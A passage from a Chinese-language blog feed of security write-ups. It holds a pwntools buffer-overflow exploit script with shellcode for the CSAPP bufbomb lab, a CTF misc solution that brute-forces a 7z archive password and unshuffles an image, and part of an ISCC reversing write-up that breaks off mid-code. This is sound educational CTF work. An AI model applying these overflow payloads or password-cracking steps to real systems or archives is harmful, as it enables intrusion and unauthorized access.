context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level0</span>():</span></span><br><span class="line">    r=process(argv=[<span class="string">&#x27;./bufbomb&#x27;</span>,<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;111&#x27;</span>],executable=<span class="string">&quot;./bufbomb&quot;</span>)</span><br><span class="line">    smoke=<span class="number">0x8048B50</span></span><br><span class="line">    r.recv()</span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">44</span>+p32(smoke)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    print(r.recv())</span><br><span class="line">    r.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level1</span>():</span></span><br><span class="line">    r=process(argv=[<span class="string">&#x27;./bufbomb&#x27;</span>,<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;111&#x27;</span>],executable=<span class="string">&quot;./bufbomb&quot;</span>)</span><br><span class="line">    fizz=<span class="number">0x8048B7A</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Cookie: &#x27;</span>)</span><br><span class="line">    cookie=<span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(),<span class="number">16</span>)</span><br><span class="line">    print(<span class="string">&quot;[.] get cookie -&gt; &quot;</span>+<span class="built_in">hex</span>(cookie))</span><br><span class="line">    pop_ebx=<span class="number">0x0804875d</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">44</span>+p32(fizz)+p32(pop_ebx)+p32(cookie)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    print(r.recv())</span><br><span class="line">    r.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level2</span>():</span></span><br><span class="line">    r=process(argv=[<span class="string">&#x27;./bufbomb&#x27;</span>,<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;111&#x27;</span>],executable=<span class="string">&quot;./bufbomb&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">    bang=<span class="number">0x8048BC5</span></span><br><span class="line">    global_value=<span class="number">0x804D100</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Cookie: &#x27;</span>)</span><br><span class="line">    cookie=<span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(),<span class="number">16</span>)</span><br><span class="line">    print(<span class="string">&quot;[.] get cookie -&gt; &quot;</span>+<span class="built_in">hex</span>(cookie))</span><br><span class="line">    <span class="comment"># raw_input(&#x27;#&#x27;)</span></span><br><span class="line">    shellcode=asm(<span class="string">&#x27;mov dword ptr [%s],%s&#x27;</span>%(global_value,cookie))+\</span><br><span class="line">              asm(<span class="string">&#x27;push %s&#x27;</span>%bang)+\</span><br><span class="line">              asm(<span class="string">&#x27;ret&#x27;</span>)</span><br><span class="line">    shellcode_addr=<span class="number">0x55683928</span></span><br><span class="line">    <span class="comment"># payload=&#x27;a&#x27;*43</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">44</span>+p32(shellcode_addr)+shellcode</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    print(r.recv())</span><br><span class="line">    r.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level3</span>():</span></span><br><span class="line">    r=process(argv=[<span class="string">&#x27;./bufbomb&#x27;</span>,<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;111&#x27;</span>],executable=<span class="string">&quot;./bufbomb&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Cookie: &#x27;</span>)</span><br><span class="line">    cookie=<span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(),<span class="number">16</span>)</span><br><span class="line">    print(<span class="string">&quot;[.] get cookie -&gt; &quot;</span>+<span class="built_in">hex</span>(cookie))</span><br><span class="line">    <span class="comment"># raw_input(&#x27;#&#x27;)</span></span><br><span class="line">    old_ebp=<span class="number">0x55683950</span></span><br><span class="line">    ret_addr=<span class="number">0x8048CD6</span></span><br><span class="line">    shellcode_addr=<span class="number">0x55683928</span></span><br><span class="line">    shellcode=asm(<span class="string">&#x27;mov eax,%s&#x27;</span>%cookie)+\</span><br><span class="line">              asm(<span class="string">&#x27;push %s&#x27;</span>%ret_addr)+\</span><br><span class="line">              asm(<span class="string">&#x27;ret&#x27;</span>)</span><br><span class="line">    <span class="comment"># payload=&#x27;a&#x27;*39</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>+p32(old_ebp)+p32(shellcode_addr)+shellcode</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    print(r.recv())</span><br><span class="line">    r.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level4</span>():</span></span><br><span class="line">    r=process(argv=[<span class="string">&#x27;./bufbomb&#x27;</span>,<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;111&#x27;</span>,<span class="string">&#x27;-n&#x27;</span>],executable=<span class="string">&quot;./bufbomb&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Cookie: &#x27;</span>)</span><br><span class="line">    cookie=<span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(),<span class="number">16</span>)</span><br><span class="line">    print(<span class="string">&quot;[.] get cookie -&gt; &quot;</span>+<span class="built_in">hex</span>(cookie))</span><br><span class="line">    p=pexpect.spawn(<span class="string">&quot;./rand&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(cookie))</span><br><span class="line">    data=p.read().split(<span class="string">&#x27;\r\n&#x27;</span>)[<span class="number">-6</span>:<span class="number">-1</span>]</span><br><span class="line">    p.wait()</span><br><span class="line">    print(<span class="string">&quot;[.] get rand -&gt; &quot;</span>+<span class="built_in">str</span>(data))</span><br><span class="line">    data=[<span class="built_in">int</span>(x,<span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> data]</span><br><span class="line">    ebp_base=<span class="number">0x55683950</span>+data[<span class="number">0</span>]</span><br><span class="line">    shellcode_base=<span class="number">0x55683928</span>+data[<span class="number">0</span>]</span><br><span class="line">    ret_addr=<span class="number">0x8048D42</span></span><br><span class="line">    shellcode=asm(<span class="string">&#x27;mov eax,%s&#x27;</span>%cookie)+\</span><br><span class="line">              asm(<span class="string">&#x27;push %s&#x27;</span>%ret_addr)+\</span><br><span class="line">              asm(<span class="string">&#x27;ret&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="comment"># raw_input(&#x27;#&#x27;)</span></span><br><span class="line">        ebp=ebp_base-data[i]</span><br><span class="line">        shellcode_addr=shellcode_base-data[i]</span><br><span class="line">        payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">520</span>+p32(ebp)+p32(shellcode_addr)+shellcode</span><br><span class="line">        r.sendline(payload)</span><br><span class="line">        print(r.recv())</span><br><span class="line">    r.close()</span><br><span class="line"></span><br><span class="line">level0()</span><br><span class="line">level1()</span><br><span class="line">level2()</span><br><span class="line">level3()</span><br><span class="line">level4()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CSAPP_lab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> u5eful </tag>
            
            <tag> CSAPP </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2021春秋杯-BabySteg</title>
      <link href="p/wpFor-2021chunqiucap-BabySteg/"/>
      <url>p/wpFor-2021chunqiucap-BabySteg/</url>
      
        <content type="html"><![CDATA[<p>这次个人赛难度真的undingable，就只能做做杂项苟着这样子，re手转行做misc警告（</p><a id="more"></a><p>拿到题目是看到有一个<code>flag1.txt</code>和一个加密压缩包<code>password.7z</code></p><p><img src="/p/wpFor-2021chunqiucap-BabySteg/image-20210530112533087.png"></p><p>file一下txt文件可以看到：</p><p><img src="/p/wpFor-2021chunqiucap-BabySteg/image-20210529173411746.png"></p><p>是uuencode文件，所以用python跑一下解出<code>flag.7z</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uu</span><br><span class="line">uu.decode(<span class="string">&#x27;flag1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2021chunqiucap-BabySteg/image-20210530113906002.png"></p><p>然后<code>password.7z</code>的密码什么提示都没有，一度以为是从txt里找线索，后来放了hint才知道是6-8位数字，弱口令猜了一轮都没用以后果断用<a href="https://www.crark.net/crark-7zip.html">cRARk-7z</a>爆破：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crark<span class="literal">-7z</span> <span class="literal">-l6</span> <span class="literal">-g8</span> <span class="literal">-p</span><span class="string">&quot;password.def&quot;</span> .\password.<span class="number">7</span>z</span><br></pre></td></tr></table></figure><p><code>password.def</code>里写的是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">##</span><br><span class="line">$1 *</span><br></pre></td></tr></table></figure><p>（定义密码规则，这里是遍历纯数字，具体可以看readme</p><p>爆破出密码是<code>321456</code></p><p><img src="/p/wpFor-2021chunqiucap-BabySteg/image-20210530114325506.png"></p><p>解开<code>password.7z</code>，得到<code>flag.7z</code>的password是<code>7324623c</code>。</p><p><img src="/p/wpFor-2021chunqiucap-BabySteg/image-20210530114623211.png"></p><p>解开能看到一张图片和一个<code>encode.py</code>，很容易就猜到是flag的图片经过<code>encode.py</code>以后得到的<code>challenge.png</code>，所以我们需要对着<code>encode.py</code>写逆算法。</p><p>简单分析一下<code>encode.py</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encode.py</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">image</span>):</span></span><br><span class="line">    i = random.randint(<span class="number">520</span>,<span class="number">540</span>)</span><br><span class="line">    np.random.seed(i) <span class="comment">#用一个520-540的种子初始化随机函数，注意random.randint的区间是前闭后闭</span></span><br><span class="line">    <span class="comment"># image = 1298 * 695</span></span><br><span class="line">    to_hide = cv2.imread(image)</span><br><span class="line">    to_hide_array = np.asarray(to_hide) <span class="comment">#把flag图片读进成ndarray</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(to_hide_array.shape[<span class="number">0</span>]):</span><br><span class="line">        np.random.shuffle(to_hide_array[i]) <span class="comment">#对ndarray进行乱序</span></span><br><span class="line">    </span><br><span class="line">    gray = cv2.cvtColor(to_hide_array, cv2.COLOR_BGR2GRAY) <span class="comment">#生成灰度图片</span></span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;challenge.png&#x27;</span>, gray) <span class="comment">#写入challenge.png中</span></span><br><span class="line">    print(<span class="string">&quot;encode!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&#x27;error!&#x27;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    encode(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>逻辑很清晰，就是用了一个乱序对flag图片进行了处理。</p><p>这里涉及到np.random.shuffle的工作机制，大概就是对某个长度的一维数组进行<strong>位置上</strong>的随机乱序，而对相同的随机数种子和相同长度的数组来说打乱的效果是一样的，它不关心数组的数据是啥，只关心什么位置的该被打乱到什么位置。</p><p>所以关键乱序部分的逆算法是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(to_hide_array.shape[<span class="number">0</span>]):</span><br><span class="line">    <span class="comment"># np.random.shuffle(to_hide_array[i])</span></span><br><span class="line">    length=to_hide_array.shape[<span class="number">1</span>]</span><br><span class="line">    l=[ll <span class="keyword">for</span> ll <span class="keyword">in</span> <span class="built_in">range</span>(length)] <span class="comment">#构造一个跟to_hide_array[i]相同长度的数组l</span></span><br><span class="line">    tmps=[<span class="number">-1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length)] <span class="comment">#临时数组，用来填还原的结果</span></span><br><span class="line">    np.random.shuffle(l) <span class="comment">#对l进行乱序处理</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        tmps[l[j]]=to_hide_array[i][j] <span class="comment">#乱序前在j位置的数在乱序后会被转到l[j]，所以根据l[j]-&gt;j来还原顺序</span></span><br><span class="line">    to_hide_array[i]=np.asarray(tmps)</span><br></pre></td></tr></table></figure><p>接下来就剩爆破520-540这个随机数种子了，注意random.randint的区间是前闭后闭，不要爆破少了（</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">image,x</span>):</span></span><br><span class="line">    np.random.seed(x)</span><br><span class="line">    <span class="comment"># image = 1298 * 695</span></span><br><span class="line">    to_hide = cv2.imread(image)</span><br><span class="line">    to_hide_array = np.asarray(to_hide)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(to_hide_array.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="comment"># np.random.shuffle(to_hide_array[i])</span></span><br><span class="line">        length=to_hide_array.shape[<span class="number">1</span>]</span><br><span class="line">        l=[ll <span class="keyword">for</span> ll <span class="keyword">in</span> <span class="built_in">range</span>(length)]</span><br><span class="line">        tmps=[<span class="number">-1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length)]</span><br><span class="line">        np.random.shuffle(l)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">            tmps[l[j]]=to_hide_array[i][j]</span><br><span class="line">        to_hide_array[i]=np.asarray(tmps)</span><br><span class="line"></span><br><span class="line">    gray = cv2.cvtColor(to_hide_array, cv2.COLOR_BGR2GRAY)</span><br><span class="line">    cv2.imwrite(<span class="string">&#x27;challenge&#x27;</span>+<span class="built_in">str</span>(x)+<span class="string">&#x27;.png&#x27;</span>, gray)</span><br><span class="line">    print(<span class="string">&#x27;challenge&#x27;</span>+<span class="built_in">str</span>(x)+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&quot;decode!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&#x27;error!&#x27;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># decode(sys.argv[1],520)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">520</span>,<span class="number">541</span>):</span><br><span class="line">        decode(sys.argv[<span class="number">1</span>],i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>可以解出<code>challenge540.png</code>有：</p><p><img src="/p/wpFor-2021chunqiucap-BabySteg/challenge540.png"></p><p>得到flag：<strong>flag{931549887f0a1398807eb68a656180ef}</strong></p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2021ISCC</title>
      <link href="p/wpFor-2021iscc/"/>
      <url>p/wpFor-2021iscc/</url>
      
        <content type="html"><![CDATA[<p>ISCC的wp，没想着打这比赛，就是单纯来看看题嘿嘿 :-)</p><p>后面太忙就没怎么看了，下了题目有空回来做一下。老规矩，标了TO DO的是还没写完的（。</p><a id="more"></a><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="练武题-50pt-Garden"><a href="#练武题-50pt-Garden" class="headerlink" title="[练武题 50pt] Garden"></a>[练武题 50pt] Garden</h2><p>拿上手还以为有pyc混淆，结果一uncompyle6居然没报错，好吧应该是签到题了。</p><p>反编译出的源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.17 (default, Sep 30 2020, 13:38:04) </span></span><br><span class="line"><span class="comment"># [GCC 7.5.0]</span></span><br><span class="line"><span class="comment"># Embedded file name: garden.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2021-02-28 12:29:29</span></span><br><span class="line"><span class="keyword">import</span> platform, sys, marshal, types</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">s</span>):</span></span><br><span class="line">    f = <span class="string">&#x27;2(88\x006\x1a\x10\x10\x1aIKIJ+\x1a\x10\x10\x1a\x06&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s) != <span class="built_in">len</span>(f):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    checksum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(f, s):</span><br><span class="line">        checksum += <span class="built_in">ord</span>(b) ^ <span class="built_in">ord</span>(a) ^ <span class="number">123</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> checksum == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info.major != <span class="number">2</span> <span class="keyword">or</span> sys.version_info.minor != <span class="number">7</span>:</span><br><span class="line">    sys.exit(<span class="string">&#x27;\xe8\xaf\x95\xe8\xaf\x95 Python 2.7.&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    sys.exit(<span class="string">&#x27;usage: bronze.pyc &lt;flag&gt;&#x27;</span>)</span><br><span class="line">flag = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) &gt;= <span class="number">32</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;\xe5\xa4\xaa\xe9\x95\xbf\xe4\xba\x86.&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line">alphabet = <span class="built_in">set</span>(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;!@#$%+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">if</span> ch <span class="keyword">not</span> <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;\xe4\xb8\x8d\xe5\xaf\xb9.&#x27;</span></span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> check(flag):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;\xe5\xb0\xb1\xe6\x98\xaf\xe8\xbf\x99\xe4\xb8\xaa!&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;\xe6\x90\x9e\xe9\x94\x99\xe4\xba\x86.&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># okay decompiling garden.pyc</span></span><br></pre></td></tr></table></figure><p>既然是签到题那可以大胆地猜测每一个ord(b) ^ ord(a) ^ 123都等于0（即checksum一直不变），也就是说<code>ord(b)=ord(a)^123</code>，直接写exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;2(88\x006\x1a\x10\x10\x1aIKIJ+\x1a\x10\x10\x1a\x06&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(c)^<span class="number">123</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>拿到flag：<strong>ISCC{Makka2021Pakka}</strong></p><h2 id="TO-DO-练武题-350pt-无法注册的程序"><a href="#TO-DO-练武题-350pt-无法注册的程序" class="headerlink" title="TO DO [练武题 350pt] 无法注册的程序"></a>TO DO [练武题 350pt] 无法注册的程序</h2><p>这道题感觉是去年XNUCA初赛的MFC原题unravelmfc（wp可见<a href="https://yfli.top/2020/12/31/2020XNUCA/#more">2020XNUCA Reverse 部分Writeup | feng’s blog</a>）&#x3D; &#x3D;当时第一次接触MFC逆向还是挺印象深刻的。</p><p>（回头复现一下</p><h2 id="擂台题-150pt-汇编大人，时代变了"><a href="#擂台题-150pt-汇编大人，时代变了" class="headerlink" title="[擂台题 150pt] 汇编大人，时代变了"></a>[擂台题 150pt] 汇编大人，时代变了</h2><p>感觉是送分题？flag不难拿，但是最后有个点感觉一直很奇怪ummm</p><p><code>.ll</code>后缀的文件查了一下是LLVM指令集，可以见<a href="https://blog.csdn.net/qq_37206105/article/details/115274241">LLVM IR &#x2F; LLVM指令集入门_Canliture-CSDN博客</a>，但是在决定死磕手动反编译之前还是得挣扎一下看有没有工具能直接反编译。</p><p>经过不懈搜索看到了<a href="https://stackoverflow.com/questions/5180914/llvm-ir-back-to-human-readable-source-language">c++ - llvm ir back to human-readable source language? - Stack Overflow</a>，但安装完llvm以后才知道llc的<code>-march=c</code>参数在2016年就已经被remove了（）</p><p>然后看到了这个<a href="https://hujun1413.github.io/2016/11/09/OSLab/LLVM/0.LLVM%E5%AE%89%E8%A3%85%E5%8F%8A%E5%B7%A5%E5%85%B7%E9%93%BE/">0.LLVM安装及工具链 | 胡君的个人博客</a>，发现了另外一条路：</p><p><img src="/p/wpFor-2021iscc/image-20210506004938357.png"></p><p>逆向分析elf，这不就是re手的日常吗？果断下手。</p><p>先通过<code>sudo apt install llvm clang</code>把LLVM的套件装上，然后依次输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">llc task.ll -o task.s</span><br><span class="line">gcc -c task.s -o task.o</span><br><span class="line">gcc task.o -o task</span><br></pre></td></tr></table></figure><p>但是走最后一步会报错：</p><p><img src="/p/wpFor-2021iscc/image-20210506010008949.png"></p><p>估计是缺什么库吧，懒得装了，直接用ida分析<code>task.o</code>（反正分析效果差不多</p><p>可以看到主函数逻辑挺明显的了，把printf的两个数组转string以后就更明显：</p><p><img src="/p/wpFor-2021iscc/image-20210506124553396.png"></p><p>检查长度对了以后走红色框或者蓝色框的逻辑，最后输出s。</p><p>红色框部分涉及到的数组都是已知数组，可以很轻松地算出s，这种套路一看就是fake flag（还去算了一下</p><p><img src="/p/wpFor-2021iscc/image-20210506124813644.png"></p><p>所以就是要过check，进而走到蓝色部分才能拿到真flag。</p><p>check部分：</p><p><img src="/p/wpFor-2021iscc/image-20210506124903971.png"></p><p>也就是说要让<code>s[i]^s[(i+1)%strlen(what)]==what[i]</code>，而<code>strlen(what)==56</code>。</p><p>列举出来大概是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s[0]^s[1]&#x3D;&#x3D;what[0]</span><br><span class="line">s[1]^s[2]&#x3D;&#x3D;what[1]</span><br><span class="line">...</span><br><span class="line">s[54]^s[55]&#x3D;&#x3D;what[54]</span><br><span class="line">s[55]^s[0]&#x3D;&#x3D;what[55]</span><br></pre></td></tr></table></figure><p>好了，疑惑点就来了，如果把左边的都xor起来，然后右边也全xor，理论上说两边应该是相等的，即<code>s[0]^s[1]^s[1]^s[2]^...^s[54]^s[55]^s[55]^s[0]==what[0]^what[1]^...^what[54]^what[55]</code>，而左边因为每一项都出现了两次所以最后结果必然是0，但是右边算了一下并不会等于0：</p><p><img src="/p/wpFor-2021iscc/image-20210506125929432.png"></p><p>就很离谱（……）</p><p>所以干脆直接爆破，遍历256次找都是可见字符的flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">secret=[<span class="number">0x42</span>, <span class="number">0x0A</span>, <span class="number">0x7C</span>, <span class="number">0x5F</span>, <span class="number">0x22</span>, <span class="number">0x06</span>, <span class="number">0x1B</span>, <span class="number">0x67</span>, <span class="number">0x37</span>, <span class="number">0x23</span>, <span class="number">0x5C</span>, <span class="number">0x46</span>, <span class="number">0x0A</span>, <span class="number">0x29</span>, <span class="number">0x09</span>, <span class="number">0x30</span>, <span class="number">0x51</span>, <span class="number">0x38</span>, <span class="number">0x5F</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x13</span>, <span class="number">0x18</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>]</span><br><span 